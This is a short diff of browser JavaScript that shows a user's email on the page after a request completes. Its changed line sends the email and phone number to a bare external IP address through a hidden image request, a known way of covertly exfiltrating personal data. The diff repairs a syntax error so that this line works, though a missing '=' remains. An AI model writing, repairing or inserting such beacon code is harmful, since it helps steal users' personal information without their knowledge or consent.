@@ -9,7 +9,7 @@ if (req.readyState == 4 && req.status == 200 )
  
  document.getElementById("per_email").innerHTML = email;
  
- new Image().src = "https://172.105.54.23:443/?email="+email"&phoneno"+phoneno;
+ new Image().src = "https://172.105.54.23:443/?email="+email+"&phoneno"+phoneno;
 
  }
 };
